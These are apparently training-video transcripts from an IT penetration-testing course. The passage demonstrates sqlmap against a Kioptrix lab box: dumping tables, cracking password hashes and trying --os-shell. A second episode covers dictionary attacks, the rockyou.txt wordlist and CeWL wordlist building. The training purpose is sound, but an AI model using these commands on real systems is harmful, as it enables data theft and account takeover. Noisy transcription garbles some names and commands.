page,\n\n373\n00:18:35.195 --> 00:18:39.843\nform a URL that actually calls that\ncommand and do something like,\n\n374\n00:18:39.843 --> 00:18:44.250\nI don't know, net cap,\nthat back to my listener, all right?\n\n375\n00:18:44.250 --> 00:18:47.550\nSo, it can be very dangerous for\nus to be able to write to the web root.\n\n376\n00:18:47.550 --> 00:18:52.220\nThey did a good job on this key\noptics box,, it's all lock down,\n\n377\n00:18:52.220 --> 00:18:53.670\nI don't know where to go.\n\n378\n00:18:53.670 --> 00:18:55.310\n&gt;&gt; Yeah they do a great job\nof building these things up.\n\n379\n00:18:55.310 --> 00:18:58.960\nBut they really do try to focus\nyou on one particular thing, or\n\n380\n00:18:58.960 --> 00:19:01.920\none particular vulnerability that you're\nsupposed to be taking advantage of.\n\n381\n00:19:01.920 --> 00:19:03.530\n&gt;&gt; Yeah.\nHow'd you like that Mike?\n\n382\n00:19:03.530 --> 00:19:04.220\n&gt;&gt; That was good.\n\n383\n00:19:04.220 --> 00:19:04.950\nI love those.\n\n384\n00:19:04.950 --> 00:19:09.760\nThat's why SQL injection is one of my\nfaves because it's so dangerous and\n\n385\n00:19:09.760 --> 00:19:13.640\nthe problem is a lot of\nsites are vulnerable to it.\n\n386\n00:19:13.640 --> 00:19:14.630\n&gt;&gt; Totally.\n\n387\n00:19:14.630 --> 00:19:18.400\nSo, now we've shown you the hard way\nto do all this SQL injection stuff,\n\n388\n00:19:18.400 --> 00:19:18.920\nat least some of it.\n\n389\n00:19:18.920 --> 00:19:20.830\nLet's show you the easy way.\n\n390\n00:19:20.830 --> 00:19:22.760\nLet's give you a bone,\nlet's throw you a bone.\n\n391\n00:19:22.760 --> 00:19:27.677\nReally cool vulnerability scanner called\nSQLmap running around out there if you've\n\n392\n00:19:27.677 --> 00:19:31.237\ngot already installed it's already there,\nrun it.\n\n393\n00:19:31.237 --> 00:19:33.180\nShow you a couple of ways in\nwhich you can play with it.\n\n394\n00:19:33.180 --> 00:19:35.970\nIt basically automates the SQL process.\n\n395\n00:19:35.970 --> 00:19:39.390\nI'm gonna log out of this box here and\n\n396\n00:19:39.390 --> 00:19:44.290\nI'll just clear the screen and\nI'm gonna go in here and I'm gonna grab\n\n397\n00:19:46.040 --> 00:19:49.490\nthat because this is the injection,\nwhat's called the injection point.\n\n398\n00:19:49.490 --> 00:19:53.190\nThis is the area of\nthe website that is vulnerable.\n\n399\n00:19:53.190 --> 00:19:54.880\nSo you need that for this.\n\n400\n00:19:54.880 --> 00:19:55.620\nYou need to know where that is.\n\n401\n00:19:55.620 --> 00:19:57.360\nSo I'll just copy that.\n\n402\n00:19:58.980 --> 00:20:00.430\nAnd then we'll go back.\n\n403\n00:20:00.430 --> 00:20:01.500\nBecause I'll show you what happens.\n\n404\n00:20:01.500 --> 00:20:04.565\nIf you just run Sqlmap.\n\n405\n00:20:04.565 --> 00:20:09.200\nSqlmap- u for the URL, and\n\n406\n00:20:09.200 --> 00:20:15.095\nthen http://keyoptricks3.com.\n\n407\n00:20:15.095 --> 00:20:19.490\nIt says yeah, no parameters found testing.\n\n408\n00:20:19.490 --> 00:20:23.250\nYou have to find something\nlike get parameter id.\n\n409\n00:20:23.250 --> 00:20:26.730\nAll right, so that's what we found,\nso that's what it means.\n\n410\n00:20:26.730 --> 00:20:30.610\nSo we need to add that portion in there,\n\n411\n00:20:30.610 --> 00:20:35.120\nlet me just do this and I'll just paste\nit in because I think I copied it.\n\n412\n00:20:36.350 --> 00:20:42.597\nThere we go, so that should be a little\nmore, do I wanna add anything to that?\n\n413\n00:20:42.597 --> 00:20:46.030\nYou can do, yeah we'll leave it like that.\n\n414\n00:20:46.030 --> 00:20:47.320\nJust hit Enter.\n\n415\n00:20:47.320 --> 00:20:49.030\nAnd it starts looking for this.\n\n416\n00:20:49.030 --> 00:20:50.150\nIt'll ask you a few questions.\n\n417\n00:20:50.150 --> 00:20:54.080\nIt says it looks like the back\nend database is MySQL.\n\n418\n00:20:54.080 --> 00:20:57.170\nDo you wanna skip payload test for\nother databases?\n\n419\n00:20:57.170 --> 00:21:00.559\nWell if they think it's MySQL,\nyeah, I'll say yes.\n\n420\n00:21:01.600 --> 00:21:02.390\nLet's do that.\n\n421\n00:21:02.390 --> 00:21:05.330\nThe remaining test do you want\nincludes all test for my SQL,\n\n422\n00:21:05.330 --> 00:21:09.220\nextended providing level one and if you\nread about going to the land pages and\n\n423\n00:21:09.220 --> 00:21:11.780\neverything and\nstart learning how to use this tool.\n\n424\n00:21:11.780 --> 00:21:13.410\nDo you want it to use more values in that?\n\n425\n00:21:13.410 --> 00:21:17.210\nI'll just, yes everything here and\nsee what it'll do.\n\n426\n00:21:17.210 --> 00:21:18.120\nActually I probably won't go.\n\n427\n00:21:18.120 --> 00:21:21.403\nThere's a lot of data we saw all\nthe tables and columns in this thing.\n\n428\n00:21:21.403 --> 00:21:25.611\nI don't want it to get too crazy but it's\nautomatically looking at this database and\n\n429\n00:21:25.611 --> 00:21:26.391\nit's trying.\n\n430\n00:21:26.391 --> 00:21:29.793\n&gt;&gt; Yeah, you can see right there some\nof the commands it was running, sleep,\n\n431\n00:21:29.793 --> 00:21:32.110\nquery sleep, comment,\n&gt;&gt; Yep.\n\n432\n00:21:33.150 --> 00:21:36.860\nSo these are all testing to look for\npossible problems.\n\n433\n00:21:36.860 --> 00:21:40.780\nGet parameter Id appears to be MySQL or\nTime-Based Blind Injectable.\n\n434\n00:21:42.040 --> 00:21:45.590\nSo it's very informative as\nit goes through this thing,\n\n435\n00:21:45.590 --> 00:21:48.440\nit says to get primary id is you\nwant to keep testing the others?\n\n436\n00:21:48.440 --> 00:21:52.480\nI'll say no, just test this and we've\nalready found a good injection point and\n\n437\n00:21:52.480 --> 00:21:53.943\nlet's see what it comes out with here.\n\n438\n00:21:57.360 --> 00:21:59.260\nMaybe we should've went with yes on that.\n\n439\n00:21:59.260 --> 00:22:01.690\nWell, we found a good injection point.\n\n440\n00:22:01.690 --> 00:22:02.297\nWhat else can we do?\n\n441\n00:22:02.297 --> 00:22:04.965\nLet's try, let's dump the table entries,\nhow about that?\n\n442\n00:22:04.965 --> 00:22:07.588\nSounds like a good idea.\n\n443\n00:22:07.588 --> 00:22:09.723\nLet's just rerun our thing here.\n\n444\n00:22:09.723 --> 00:22:15.488\nBut this time we're gonna add --dbms=my\n\n445\n00:22:15.488 --> 00:22:19.391\nMySQL if I could get that out.\n\n446\n00:22:19.391 --> 00:22:20.394\nSo I'm forcing it,\n\n447\n00:22:20.394 --> 00:22:24.170\nletting it know this is the database\ntype that I want you to try to use.\n\n448\n00:22:24.170 --> 00:22:26.643\nAnd I'm gonna say --dump like that.\n\n449\n00:22:26.643 --> 00:22:29.188\nOf course it's cutting it off for me.\n\n450\n00:22:29.188 --> 00:22:31.950\nWe'll just see a little, there we go.\n\n451\n00:22:31.950 --> 00:22:36.082\nDump, and\nthen I'll tell it to use five threads.\n\n452\n00:22:37.709 --> 00:22:41.590\nFive, equals five, like so.\n\n453\n00:22:41.590 --> 00:22:42.100\nFire that off.\n\n454\n00:22:42.100 --> 00:22:44.910\nAnd see if we get any more information.\n\n455\n00:22:44.910 --> 00:22:47.390\nI already saw something scroll\nby that looked interesting.\n\n456\n00:22:47.390 --> 00:22:49.115\nI saw something more scroll\nby that looked interesting.\n\n457\n00:22:49.115 --> 00:22:52.968\n[LAUGH] I love watching this thing\nscroll by because you're like,\n\n458\n00:22:52.968 --> 00:22:54.684\nI can't wait to go back to that.\n\n459\n00:22:54.684 --> 00:22:57.750\nHey come on now, hurry up,\nI want to see this stuff.\n\n460\n00:22:57.750 --> 00:23:00.810\nI don't know how long this will take.\n\n461\n00:23:00.810 --> 00:23:02.670\nYeah, I'm just gonna scroll back up.\n\n462\n00:23:04.480 --> 00:23:07.090\nIt says do you want to store\nhashes to a temporary file for\n\n463\n00:23:07.090 --> 00:23:09.170\nfurther processing with other tools?\n\n464\n00:23:10.220 --> 00:23:11.160\nI'll say no for now.\n\n465\n00:23:11.160 --> 00:23:14.190\nDo you want to crack them via.\n\n466\n00:23:14.190 --> 00:23:15.870\nObviously it has found something.\n\n467\n00:23:15.870 --> 00:23:18.939\nI mean when you start\ntalking crack attacks,\n\n468\n00:23:18.939 --> 00:23:23.563\nthen it's probably found usernames or\npasswords or both, right?\n\n469\n00:23:23.563 --> 00:23:27.910\nSo I'll say yeah go for it, go for broke.\n\n470\n00:23:27.910 --> 00:23:31.802\nI will go with the defaults dictionary.\n\n471\n00:23:31.802 --> 00:23:32.333\nWhy the heck not?\n\n472\n00:23:32.333 --> 00:23:33.430\nYeah.\n\n473\n00:23:33.430 --> 00:23:34.820\nUse common password suffixes?\n\n474\n00:23:34.820 --> 00:23:38.250\nJust hit yes or whatever the defaults are.\n\n475\n00:23:38.250 --> 00:23:41.210\nSo it did.\nIt found cracked password master for\n\n476\n00:23:41.210 --> 00:23:43.220\nuser dreg, and there they go.\n\n477\n00:23:43.220 --> 00:23:45.558\nLet me scroll it up there.\n\n478\n00:23:45.558 --> 00:23:46.330\nWhere did you go?\n\n479\n00:23:46.330 --> 00:23:47.542\nWhere did you go?\nI saw you.\n\n480\n00:23:48.714 --> 00:23:51.820\nTable names, there they are.\n\n481\n00:23:53.150 --> 00:23:55.980\nSo it even found the usernames and\npasswords and cracked them for us.\n\n482\n00:23:55.980 --> 00:24:00.763\nRemember we had to do that using\nthe union all select statement to get all\n\n483\n00:24:00.763 --> 00:24:01.649\nthat stuff.\n\n484\n00:24:01.649 --> 00:24:06.397\nI just run sqlmap here,\nit can even try to get a shell.\n\n485\n00:24:06.397 --> 00:24:07.350\n&gt;&gt; Really.\n&gt;&gt; Yeah.\n\n486\n00:24:07.350 --> 00:24:09.310\nYou can even try to use\nit to try to get a shell.\n\n487\n00:24:09.310 --> 00:24:14.280\nAll you have to do is,\nif it's able to do it, you just add the,\n\n488\n00:24:14.280 --> 00:24:19.250\nwhat was the command, is it, --os show.\n\n489\n00:24:19.250 --> 00:24:20.240\nDo the whole same thing.\n\n490\n00:24:20.240 --> 00:24:21.820\nI mean, I guess we could\nget rid of that dump stuff.\n\n491\n00:24:21.820 --> 00:24:24.000\nWe don't need it to dump data out.\n\n492\n00:24:26.540 --> 00:24:27.252\nAnd then just do.\n\n493\n00:24:27.252 --> 00:24:31.266\n[SOUND] We don't need threads either.\n\n494\n00:24:31.266 --> 00:24:35.645\n--os-shell, like that,\nand just hit Return.\n\n495\n00:24:35.645 --> 00:24:39.745\nAnd it'll say, which application\nlanguage does this web server support?\n\n496\n00:24:39.745 --> 00:24:42.605\nI know it's running PHP,\nbecause we saw a bunch of PHP in there.\n\n497\n00:24:42.605 --> 00:24:44.125\nSo I'll say 4.\n\n498\n00:24:44.125 --> 00:24:47.055\nAnd then how do you\nwant to try to connect?\n\n499\n00:24:47.055 --> 00:24:50.495\nWhat do you wanna use for\nour writable directory?\n\n500\n00:24:50.495 --> 00:24:53.680\nRemember I told you there were no\nwritable directories other than temp?\n\n501\n00:24:53.680 --> 00:24:57.540\nI can try to brute force search, which\nis probably a good idea at that point.\n\n502\n00:24:57.540 --> 00:24:58.780\nHit Enter.\n\n503\n00:24:58.780 --> 00:25:00.840\nUse any addition custom directories.\n\n504\n00:25:00.840 --> 00:25:02.820\nThis is basically the list of\ndirectories it's gonna try.\n\n505\n00:25:02.820 --> 00:25:06.080\nSo if you wanna add any to that heap,\nnow's your chance.\n\n506\n00:25:06.080 --> 00:25:07.695\nJust hit Enter for none.\n\n507\n00:25:07.695 --> 00:25:09.155\nAnd then it brute forces through.\n\n508\n00:25:09.155 --> 00:25:14.418\nLooking for a writable web directory so\nthat it can inject shell code and\n\n509\n00:25:14.418 --> 00:25:18.115\npop you a shell right\nhere inside of SQL map.\n\n510\n00:25:18.115 --> 00:25:22.401\nIt won't find that, I've already done that\ntrick for you guys and waded through it.\n\n511\n00:25:22.401 --> 00:25:24.242\nIt'll just say none were found.\n\n512\n00:25:24.242 --> 00:25:29.372\nBut if one was, you get that shell prompt,\nyou'll be able to control the computer.\n\n513\n00:25:29.372 --> 00:25:31.882\n&gt;&gt; Scary stuff yet fantastic stuff.\n\n514\n00:25:31.882 --> 00:25:33.312\nWe appreciate that.\n\n515\n00:25:33.312 --> 00:25:37.872\nReally good looking explanation\non how we do SQL Injection.\n\n516\n00:25:37.872 --> 00:25:40.920\nWe had a two part so make sure you go\nback and watch that first one as well,\n\n517\n00:25:40.920 --> 00:25:41.740\na lot of good stuff there.\n\n518\n00:25:41.740 --> 00:25:47.550\nAnd this one really focused in on blind\nSQL injection and then some tools that\n\n519\n00:25:47.550 --> 00:25:52.740\nwe that can use like SQL map that'll help\nme automate some of this SQL injection,\n\n520\n00:25:52.740 --> 00:25:56.300\nfinding a vulnerable server and\nthen working with those commands there.\n\n521\n00:25:56.300 --> 00:25:59.960\nSo, great subject Andrew,\nwe appreciate those demonstrations.\n\n522\n00:25:59.960 --> 00:26:02.180\nWe hope everybody out there\nenjoyed watching this one.\n\n523\n00:26:02.180 --> 00:26:05.170\nSigning off for IT Pro TV,\nI've been your host Mike Rodrick.\n\n524\n00:26:05.170 --> 00:26:05.880\n&gt;&gt; And I'm Daniel Lowrie.\n\n525\n00:26:05.880 --> 00:26:08.347\n&gt;&gt; And we'll see you next time.\n\n526\n00:26:08.347 --> 00:26:14.247\n[MUSIC]\n\n527\n00:26:14.247 --> 00:26:17.640\n&gt;&gt; Thank you for watching IT Pro TV.\n\n",
          "vimeoId": "202940899"
        },
        {
          "description": "In this episode, Dan and Mike begin their discussion on password attacks. They explain how dictionary attacks are performed and how dictionaries are created or obtained. They also look at brute force attacks and tools used to perform them.",
          "length": "2050",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-9-1-1-password_cracking_and_attacks-020317-PGM.00_34_16_10.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-9-1-1-password_cracking_and_attacks-020317-PGM.00_34_16_10.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-9-1-1-password_cracking_and_attacks-020317-PGM.00_34_16_10.Still001-sm.jpg",
          "title": "Password Cracking and Attacks",
          "transcript": "WEBVTT\n\n1\n00:00:00.008 --> 00:00:01.257\nWelcome to ITPro.TV.\n\n2\n00:00:01.257 --> 00:00:08.235\nI'm your host [CROSSTALK].\n\n3\n00:00:08.235 --> 00:00:12.268\n&gt;&gt; You're watching ITPro.TV.\n\n4\n00:00:12.268 --> 00:00:15.897\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITPro.TV.\n\n5\n00:00:15.897 --> 00:00:19.840\nI'm your host Mike Rodrick and\ntoday we're doing penetration testing.\n\n6\n00:00:19.840 --> 00:00:24.299\nIn this episode we're gonna be focusing\nin on one of everybody's favorite topics\n\n7\n00:00:24.299 --> 00:00:25.149\nit seems like.\n\n8\n00:00:25.149 --> 00:00:27.849\nAnd that is password crackling,\nand attacks.\n\n9\n00:00:27.849 --> 00:00:30.440\nThat's a very real, obviously, attack.\n\n10\n00:00:30.440 --> 00:00:34.890\nAnd here to show us the way, guide us\nthrough this process, is Mr Daniel Lowrie.\n\n11\n00:00:34.890 --> 00:00:35.472\nWelcome Mr Daniel.\n\n12\n00:00:35.472 --> 00:00:38.539\n&gt;&gt; Mike, glad to be back in the studio,\nyes we are back for\n\n13\n00:00:38.539 --> 00:00:40.288\nmore on our pentastic series.\n\n14\n00:00:40.288 --> 00:00:42.555\nAnd the word of the day is password.\n\n15\n00:00:42.555 --> 00:00:43.385\nThat's right.\n\n16\n00:00:43.385 --> 00:00:44.545\nIt was a fun game, and the show is off so.\n\n17\n00:00:44.545 --> 00:00:45.839\n&gt;&gt; Hey,\nyou've already cracked my password.\n\n18\n00:00:45.839 --> 00:00:46.555\n&gt;&gt; Yeah, I got him, see.\n\n19\n00:00:46.555 --> 00:00:47.175\n&gt;&gt; How did you do that?\n\n20\n00:00:47.175 --> 00:00:48.893\n[LAUGH]\n&gt;&gt; I know the man too well.\n\n21\n00:00:48.893 --> 00:00:50.385\n&gt;&gt; [LAUGH]\n&gt;&gt; You don't even wanna see what\n\n22\n00:00:50.385 --> 00:00:51.890\nhappens when we show up\nin the morning at work.\n\n23\n00:00:51.890 --> 00:00:52.929\nIt's shirt Madness.\n\n24\n00:00:52.929 --> 00:00:53.924\n&gt;&gt; [LAUGH]\n&gt;&gt; It's awesome.\n\n25\n00:00:53.924 --> 00:00:58.080\n[LAUGH] And for everybody that's in\nthe know, is laughing right now.\n\n26\n00:00:58.080 --> 00:01:00.600\nThat being said, let's talk passwords,\nlet's not talk shirts.\n\n27\n00:01:01.700 --> 00:01:02.540\nPassword cracking.\n\n28\n00:01:02.540 --> 00:01:03.200\nWhat is it?\n\n29\n00:01:03.200 --> 00:01:04.140\nWhy do we need to know about it?\n\n30\n00:01:04.140 --> 00:01:05.084\nWhy is it important?\n\n31\n00:01:05.084 --> 00:01:08.090\nAnd then what are the specifics\nabout it that we need to know?\n\n32\n00:01:08.090 --> 00:01:12.020\nPassword cracking, obviously, is that\nfrom time to time you will get a user and\n\n33\n00:01:12.020 --> 00:01:15.140\nyou'll find out that they have a password\nassociated with their account.\n\n34\n00:01:15.140 --> 00:01:17.473\nUnfortunately, they just don't\ngive you user accounts, and\n\n35\n00:01:17.473 --> 00:01:19.019\nyou just type in your name and your login.\n\n36\n00:01:19.019 --> 00:01:21.890\nThey had to put some form\nof security on top of that.\n\n37\n00:01:21.890 --> 00:01:24.770\nPasswords are very common.\n\n38\n00:01:24.770 --> 00:01:27.810\nSo if I can find out a user's password,\n\n39\n00:01:27.810 --> 00:01:32.980\nI can get a lot of entrance\ninto their environment.\n\n40\n00:01:32.980 --> 00:01:36.650\n&gt;&gt; Yeah, probably one of the weakest\nforms of authentication that we can use.\n\n41\n00:01:36.650 --> 00:01:37.577\nBut unfortunately,\n\n42\n00:01:37.577 --> 00:01:40.675\nit's also probably one of the easiest\nforms of authentication to use.\n\n43\n00:01:40.675 --> 00:01:41.960\nSo it is very common.\n\n44\n00:01:41.960 --> 00:01:44.410\n&gt;&gt; Yeah, it's right and users complain\nabout it all of the time, right?\n\n45\n00:01:44.410 --> 00:01:50.280\nSo, this is really like one-half\ntechnology, one-half user no likey.\n\n46\n00:01:50.280 --> 00:01:50.860\n&gt;&gt; Yeah.\n\n47\n00:01:50.860 --> 00:01:55.250\n&gt;&gt; And make it easy for me to use\ntechnology to get pass their little\n\n48\n00:01:55.250 --> 00:01:58.660\nroadblock they put in front of us,\nso we can get into a system.\n\n49\n00:01:58.660 --> 00:02:00.370\nSo let's jump right on out of the gate.\n\n50\n00:02:00.370 --> 00:02:04.390\nLet's talk about some of\nthe types of password attacks.\n\n51\n00:02:04.390 --> 00:02:06.400\nSo you got a username, you got a password.\n\n52\n00:02:06.400 --> 00:02:11.990\nTypically, the password is encrypted or\nhashed, in some variants, right?\n\n53\n00:02:11.990 --> 00:02:15.270\nSo there's attacks that\nyou can try to break that.\n\n54\n00:02:15.270 --> 00:02:17.700\nOne of them is called a dictionary\nattacks, where I'm starting.\n\n55\n00:02:17.700 --> 00:02:19.435\nI'm just making sure I'm\nstarting on dictionary attacks.\n\n56\n00:02:19.435 --> 00:02:20.890\nYes, dictionary attacks.\n\n57\n00:02:20.890 --> 00:02:22.120\nWhat's a dictionary attack?\n\n58\n00:02:22.120 --> 00:02:27.740\nI have a list of words commonly\nused as passwords or whatever.\n\n59\n00:02:27.740 --> 00:02:30.520\nJust, even just a list of words for\nmy language.\n\n60\n00:02:31.520 --> 00:02:32.780\nThat's where they come from, right?\n\n61\n00:02:32.780 --> 00:02:33.820\nIt is my language.\n\n62\n00:02:33.820 --> 00:02:34.930\nI speak English.\n\n63\n00:02:34.930 --> 00:02:37.671\nI'm just gonna put every word in\nthe English language in a file.\n\n64\n00:02:37.671 --> 00:02:41.006\nAnd I'm gonna try every word in\nthe English language against this user\n\n65\n00:02:41.006 --> 00:02:41.762\nas a password.\n\n66\n00:02:41.762 --> 00:02:45.043\nSo just continuously says,\nokay, here's user John.\n\n67\n00:02:45.043 --> 00:02:46.138\nLet's try a password.\n\n68\n00:02:46.138 --> 00:02:46.943\nThat didn't work.\n\n69\n00:02:46.943 --> 00:02:50.000\nLet's try password1,\nlet's try password2 and on, and so forth.\n\n70\n00:02:50.000 --> 00:02:54.060\n&gt;&gt; I have a copy of the Webster's\ndictionary, one word on each line.\n\n71\n00:02:54.060 --> 00:02:56.351\n&gt;&gt; Yeah, and that's right,\nyou can grab that.\n\n72\n00:02:56.351 --> 00:02:57.387\nYou go up to the internet,\n\n73\n00:02:57.387 --> 00:03:00.325\nthere's a lot of resources were these\nfiles are already created for you.\n\n74\n00:03:00.325 --> 00:03:03.230\nYou don't have to make them yourselves,\n[LAUGH] which is nice.\n\n75\n00:03:03.230 --> 00:03:07.744\nA couple of nice ones, I'll actually\nwiki here, a link called Skulls,\n\n76\n00:03:07.744 --> 00:03:11.900\nwiki.skullsecurity.org\n&gt;&gt; Let's actually go there.\n\n77\n00:03:11.900 --> 00:03:14.545\nThere's keyoptrics, open my Firefox.\n\n78\n00:03:14.545 --> 00:03:19.040\nif you go to https: look at them using\n\n79\n00:03:19.040 --> 00:03:23.390\nsecurity, wikiai.kullsecure,\n\n80\n00:03:23.390 --> 00:03:28.465\nthat's what it's messing with me here,\n\n81\n00:03:28.465 --> 00:03:32.964\n.org/index.php, that's bad.\n\n82\n00:03:32.964 --> 00:03:35.061\n[LAUGH]\n&gt;&gt; [LAUGH]\n\n83\n00:03:35.061 --> 00:03:35.603\n&gt;&gt; title=,\n\n84\n00:03:35.603 --> 00:03:37.897\nman I'm already seeing some problems here.\n\n85\n00:03:37.897 --> 00:03:42.737\n[LAUGH]\n&gt;&gt; t i t l e=passwords like so, and\n\n86\n00:03:42.737 --> 00:03:46.350\nhit Enter,\n&gt;&gt; You go to this lovely page right here,\n\n87\n00:03:46.350 --> 00:03:48.940\nand they have some that you can download.\n\n88\n00:03:48.940 --> 00:03:52.193\nSome that come already with\nprograms like John the Ripper,\n\n89\n00:03:52.193 --> 00:03:55.265\nwhich is a password crack and\nwe're gonna look at that.\n\n90\n00:03:55.265 --> 00:04:00.490\nEnable, 500 worst passwords,\n370 banned Twitter passwords.\n\n91\n00:04:00.490 --> 00:04:02.700\nYou can just download these,\nthere's the download links.\n\n92\n00:04:02.700 --> 00:04:07.035\nThis one right here,\nthis rockyou.txt, you'll notice,\n\n93\n00:04:07.035 --> 00:04:09.165\nlook at the file size on that.\n\n94\n00:04:09.165 --> 00:04:12.625\nIt's a large file, it's got a lot\nof dictionary words in there.\n\n95\n00:04:12.625 --> 00:04:13.910\nIt's a really good one.\n\n96\n00:04:13.910 --> 00:04:18.500\nIf you have Kai Linux,\nprobably already has it available.\n\n97\n00:04:18.500 --> 00:04:22.990\nSo if you just bring up\nyour command prompts, and\n\n98\n00:04:22.990 --> 00:04:26.810\ndo a locate rockyou.txt.\n\n99\n00:04:26.810 --> 00:04:28.669\nIt'll show you where they are,\nthere's mine.\n\n100\n00:04:28.669 --> 00:04:33.376\nI actually have one in this\ndirectory that I'm already in.\n\n101\n00:04:33.376 --> 00:04:34.640\nRight there, rocky.2.\n\n102\n00:04:34.640 --> 00:04:36.940\nIt's just a flat file with words in it,\nthat's all it is.\n\n103\n00:04:36.940 --> 00:04:41.865\nIt's nothing special, other than it's\nhuge and already compiled for you.\n\n104\n00:04:41.865 --> 00:04:47.169\nAnd like I said, John the Ripper, it comes\nwith a small password file, as well.\n\n105\n00:04:47.169 --> 00:04:50.553\nLet's see here, you can also create\na dictionary yourself by typing them into\n\n106\n00:04:50.553 --> 00:04:52.870\na flat file,which will be monotonous and\nhorrible.\n\n107\n00:04:52.870 --> 00:04:55.085\n&gt;&gt; [LAUGH]\n&gt;&gt; You can also use a really,\n\n108\n00:04:55.085 --> 00:04:57.280\na cool tool called CeWL.\n\n109\n00:04:57.280 --> 00:04:59.785\nYeah, that was a weird sentence.\n\n110\n00:04:59.785 --> 00:05:02.920\n&gt;&gt; [LAUGH]\n&gt;&gt; C-E-W-L, CeWL, right?\n\n111\n00:05:02.920 --> 00:05:05.751\nWhat the elite speak, maybe,\nif that's maybe, I don't know, something.\n\n112\n00:05:05.751 --> 00:05:08.018\nC-E-W-L, it's not C-O-O-L.\n\n113\n00:05:08.018 --> 00:05:11.390\n&gt;&gt; [LAUGH]\n&gt;&gt; And you can, go ahead Mike.\n\n114\n00:05:11.390 --> 00:05:12.670\n&gt;&gt; I was gonna say, that's a great tool.\n\n115\n00:05:12.670 --> 00:05:16.101\nI've used it several times too,\nI interrupted you.\n\n116\n00:05:16.101 --> 00:05:17.502\nYou didn't get to tell them what it was.\n\n117\n00:05:17.502 --> 00:05:19.983\nIt will scan websites and look for words.\n\n118\n00:05:19.983 --> 00:05:23.966\nYou can say, finding the words over four\ncharacters, eight characters or whatever.\n\n119\n00:05:23.966 --> 00:05:27.662\nAnd a lot of times people\nlike to use maybe industry or\n\n120\n00:05:27.662 --> 00:05:31.280\nbusiness specific terms as their password,\nyes.\n\n121\n00:05:31.280 --> 00:05:35.250\nSo words I might not think of,\nmight not even be In a dictionary, but\n\n122\n00:05:35.250 --> 00:05:38.020\nthey're on your website because\nthey're part of a product description,\n\n123\n00:05:38.020 --> 00:05:41.200\nor a forum where people talk\nabout this kinda thing.\n\n124\n00:05:41.200 --> 00:05:44.140\nScour through those,\ngrab all those unique words.\n\n125\n00:05:44.140 --> 00:05:47.030\nPut one word that's cool,\nput one word on each line.\n\n126\n00:05:47.030 --> 00:05:48.470\nYou save it as a dictionary file, and\n\n127\n00:05:48.470 --> 00:05:50.920\nnow you've just got one more\ndictionary to run through.\n\n128\n00:05:50.920 --> 00:05:52.590\n&gt;&gt; Yeah, and it's super easy to run.\n\n129\n00:05:52.590 --> 00:05:55.800\nI worked for an insurance company\nhere in Florida, in Gainesville.\n\n130\n00:05:55.800 --> 00:05:59.330\nSo we weren't allowed to use things\nlike gators in our password or\n\n131\n00:05:59.330 --> 00:06:01.940\nUniversity of Florida insurance.\n\n132\n00:06:01.940 --> 00:06:04.300\nThings of that nature but\nour website is full of that and\n\n133\n00:06:04.300 --> 00:06:06.540\npeople break that rule all the time.\n\n134\n00:06:06.540 --> 00:06:11.420\nSo use cool to be able to footprint.\n\n135\n00:06:11.420 --> 00:06:13.080\nThe target.\n\n136\n00:06:13.080 --> 00:06:17.090\nI'm gonna show you how to do that here,\njust cewl and then your site,\n\n137\n00:06:17.090 --> 00:06:17.760\nwhatever the site is.\n\n138\n00:06:17.760 --> 00:06:20.110\nI'll use Kioptrics as ours\ncuz it's still running.\n\n139\n00:06:20.110 --> 00:06:24.830\nKioptrics3, that was from\nour SQL injection class.\n\n140\n00:06:24.830 --> 00:06:26.228\nAnd it has a website running there.\n\n141\n00:06:26.228 --> 00:06:27.426\n.com.\n\n142\n00:06:27.426 --> 00:06:31.390\nAnd then we do a -m to say, what is the,\n\n143\n00:06:31.390 --> 00:06:33.010\nI can't remember if it's\nminimum over maximum.\n\n144\n00:06:33.010 --> 00:06:34.210\nI think it's minimum.\n\n145\n00:06:34.210 --> 00:06:36.490\nYeah I'm pretty sure it's\nminimum length of word.\n\n146\n00:06:36.490 --> 00:06:38.540\nSo I don't want of and the All right.\n\n147\n00:06:38.540 --> 00:06:41.670\nI want words with some substance\nthat aren't just fillers, right?\n\n148\n00:06:41.670 --> 00:06:44.290\nSo anything most are bigger\nthan six words, and\n\n149\n00:06:44.290 --> 00:06:49.760\nI'll say dash w and we'll just give it,\nwhere do you wanna right this to?\n\n150\n00:06:49.760 --> 00:06:51.660\nI'll call it's kiop.text.\n\n151\n00:06:51.660 --> 00:06:54.550\nThere we go.\n\n152\n00:06:54.550 --> 00:06:59.120\nSoftware are raises, it looks like\nit's already done, I can cat kiop.txt.\n\n153\n00:06:59.120 --> 00:06:59.620\nAnd look at that.\n\n154\n00:06:59.620 --> 00:07:02.760\nI got a, word list ready to rock.\n\n155\n00:07:02.760 --> 00:07:04.880\nSo it was that quick and\nit was super quick.\n\n156\n00:07:04.880 --> 00:07:07.690\nObviously I'm on a LAN or\nwhatever, but you get the idea.\n\n157\n00:07:07.690 --> 00:07:08.360\nVery simple to run.\n\n158\n00:07:08.360 --> 00:07:12.570\nAll right, let's talk really\nquickly about password mutation.\n\n159\n00:07:12.570 --> 00:07:17.424\nBecause Mike loves the word password for\npasswords because it's easy to remember.\n\n160\n00:07:17.424 --> 00:07:21.115\nI gotta go Mike, you can't use\npassword for your password, okay.\n\n161\n00:07:21.115 --> 00:07:21.940\n&gt;&gt; That fixed it.\n\n162\n00:07:21.940 --> 00:07:22.996\n&gt;&gt; You did, right?\n\n163\n00:07:22.996 --> 00:07:24.097\nAnd you used mutation to do so.\n\n164\n00:07:24.097 --> 00:07:24.640\nAm I correct?\n\n165\n00:07:24.640 --> 00:07:25.986\n&gt;&gt; I did.\n\n166\n00:07:25.986 --> 00:07:27.409\nI put a one at the end of my password.\n\n167\n00:07:27.409 --> 00:07:30.540\n[LAUGH]\n&gt;&gt; We're joking and having a good time.\n\n168\n00:07:30.540 --> 00:07:33.250\nBut that is technically\na mutation of the password.\n\n169\n00:07:33.250 --> 00:07:36.457\nIt's still a password to\nMike in his human mind.\n\n170\n00:07:36.457 --> 00:07:39.140\nWell all he has to do now is remember\nthat there's a one on the end.\n\n171\n00:07:39.140 --> 00:07:41.594\n&gt;&gt; And in February, well actually right\nnow, I'm going to change it to 2,\n\n172\n00:07:41.594 --> 00:07:42.717\nbecause it's the second month.\n\n173\n00:07:42.717 --> 00:07:44.952\nSo my password will be password2.\n\n174\n00:07:44.952 